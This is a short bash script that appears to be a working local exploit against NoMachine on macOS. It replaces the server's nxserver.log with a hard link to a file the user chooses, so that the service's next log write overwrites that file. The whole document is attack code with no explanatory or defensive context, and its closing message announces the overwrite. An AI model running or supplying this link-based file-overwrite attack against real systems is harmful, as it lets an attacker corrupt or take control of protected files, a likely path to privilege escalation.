#!/bin/bash

file_exists() {
  if [ -f "$1" ]; then
    return 0
  else
    return 1
  fi
}

file_writable() {
  if [ -w "$1" ]; then
    return 0
  else
    return 1
  fi
}

if [ $# -eq 0 ]; then
  echo "Usage: $0 <target_file>"
  exit 1
fi

TARGET="$1"

if ! file_exists "$TARGET" || ! file_writable "$TARGET"; then
  echo "Invalid target file: $TARGET"
  exit 2
fi

DEST=/Library/Application\ Support/NoMachine/var/log/nxserver.log

if ! file_exists "$DEST" || ! file_writable "$DEST"; then
  echo "Invalid destination file: $DEST"
  exit 3
fi

ln -f "$TARGET" "$DEST"
echo "[*] Created link; once NoMachine has triggered log write, $TARGET will be overwritten"
